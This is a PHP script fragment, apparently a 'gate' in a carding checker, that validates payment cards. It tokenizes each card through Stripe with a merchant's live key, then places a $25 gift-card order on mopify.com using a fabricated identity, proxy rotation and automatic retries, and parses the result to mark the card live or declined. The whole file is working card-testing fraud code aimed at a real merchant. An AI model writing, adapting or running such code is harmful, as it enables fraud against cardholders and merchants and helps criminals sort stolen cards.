<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F1104f1bb4%3B+stripe-js-v3%2F1104f1bb4&time_on_page='.rand(50000, 100000).'&key=pk_live_hAMM4StQ5faylaenpsdvqRDy';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$tok = $json_r1->id;

$r2 = $this->curlx->Get('https://mopify.com/gift-cards', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$data = 'recipientName='.$fake->first.'+'.$fake->last.'&amount=25&recipientEmail='.urlencode($fake->email).'&firstName='.$fake->first.'&lastName='.$fake->last.'&email='.urlencode($fake->email).'&phone=2564567654&address=1291+park+rd&apartment=&city=Campbellton&province=Prince+Edward+Island&postalCode=B9Y+0B0&stripeToken='.$tok.'';

$r3 = $this->curlx->Post('https://mopify.com/gift-cards', $data, null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

if (empty($err = trim(strip_tags($this->getstr($r3->body, '<h4 class="text-center alert alert-danger">', '<'))))) file_put_contents('sti_no_err.txt', $r3->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r3->body, $err);

end: